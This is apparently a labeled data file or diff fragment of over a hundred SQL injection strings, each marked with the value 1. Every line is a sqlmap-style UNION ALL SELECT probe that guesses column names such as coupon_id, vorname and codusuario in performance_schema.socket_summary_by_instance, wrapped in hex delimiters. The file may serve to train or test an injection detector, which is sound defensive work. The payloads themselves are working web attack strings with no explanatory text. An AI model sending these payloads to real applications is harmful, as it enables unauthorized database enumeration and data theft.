+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT multipolygon FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- YdZL",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT tipo_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ptIL",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT xproprietario FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- qHsi",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT state_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- GfoI",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT mopc FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- GQwL",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT valorcontabil FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- AcGJ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT xprocesso FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- xIdC",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT coupon_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ZYdp",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT currency_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- nVXw",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT parameter_name FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- FmDW",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT contribuinte_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- eaZM",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT xcubo FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- wOOI",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT id_fatura FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- YtAa",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT serienfe_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- jItD",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT tax_rate_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- TvBs",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT waiting_list_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- pBqD",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT download_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ZHRm",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT emissao FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- qseG",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT screen FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- hKzM",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT xcustom3 FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- obPR",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT mbpc FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- pMuP",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT documento_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- thlY",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT xcustom4 FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- agGv",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT fieldid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- FpOI",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT point FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Rokq",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT xsituacao FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- xhuW",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT icmssp FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- tuQf",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT tidproduto FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- YCjj",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT pp FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- PuDT",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT empresa_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- CNnu",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT i_tel FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- rDDe",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT contador_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Pwmh",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT telefones_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- pzWg",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT estado_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- TgyZ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT xevento FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- CPLk",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT site FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- NbdF",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT order_currency FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- PIcL",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT xprocesso_apensado FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- bSmp",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT multastrategy_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ubDi",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT saida FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- dSfa",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT grupo_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- rXmj",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT guid_sessao FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- prnc",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT indice FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- MCik",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT xjurisdicao FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- BOZN",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT news_category_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- xQdC",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT mf_category_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- NTVO",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT product_type_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- DjzJ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT xusuario FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- gJBF",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT vendor_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- srKI",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT sitepref_name FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- SkWg",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT desd_xjurisdicao FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- xFjH",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT option_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- nrZo",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT xrelatorio FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- kavt",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT codusuario FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- KhvU",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT id_cidade FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- EhPJ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT user_info_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- nnqw",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT desd_xfase FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- xuxv",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT situacao FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- nZhD",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT file_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- mEQs",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT zone_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- QJXz",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT id_servico FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- LWXt",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT situacao_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- CsXC",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT tidfornecedor FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- KuOu",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT valor2 FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- xakp",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT valor3 FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- whdv",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT valor4 FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- EMju",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT valor5 FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- GELQ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT origem FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- UvWM",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT few FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- utXm",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT idxatv FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- GuQb",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT mopp FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- QQea",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT prestador_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- XOHj",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT xprognostico FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- jvpj",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT xclasse FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- HYwj",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT log_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- sQAp",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT xadverso FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- zlSl",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT guid_email FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- sEFT",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT guiaavulsa_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- DdIT",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT pl FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- kccZ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT vendor_category_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- THUk",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT venc2 FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Zuhs",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT totpc FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- oWNs",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT venc5 FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- XCIh",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT venc4 FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- SkUZ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT xserie FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- lROv",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT order_info_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- qwkJ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT an FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- MQLd",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT totpp FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- JIWj",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT totpv FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- XUkW",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT imagen_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- gZtV",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT esquema FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- BkaW",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT atividade_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- LCir",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT xgarantia FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- wnTg",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT discount_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- kVHx",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT xnatureza FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- FXdR",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT group_perm_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- YyIG",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT category_child_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- FGwm",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT newssummaryauthor FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- qiTI",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT and_xevento FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- NkEy",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT rolle_nr FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- aomX",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT standort_nr FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- IIWB",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT ja FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Asdn",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT persnr FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- EpVI",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT vorname FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- juLm",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT width FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- EGCA",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT titel FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- FxxQ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT filename FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- PTsV",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT post_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- WIPh",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT swidth FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- uZZq",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT height FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- eCmI",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT vorgaenger FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- tgSK",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT matrnr FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- tyUC",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT kursnr FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- nJfb",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT notification_type FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- DECz",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT sheight FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- fAxt",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT style_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- EQfL",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT startnummer FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- VyZd",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT bezeichnung FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- TVVt",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT basename FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ZxKa",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT kat_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Mqpm",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT whabfragen FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- SSAa",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT struct_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- SibK",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT havabfragen FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Rcbb",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT abfrsql FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Sgrp",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT vorlnr FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- UEKX",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT ban_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- KTmV",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT forum_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- PrVx",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT rank_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- DfUe",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT nr FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- oRuz",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT k_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- iytK",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT nachname FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Iwqy",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT ort FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- WwJG",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT key_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- mhhf",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT groesse FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- LrgC",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT datum FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- dmDG",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT image_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- MfzJ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT entry FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- dQim",1
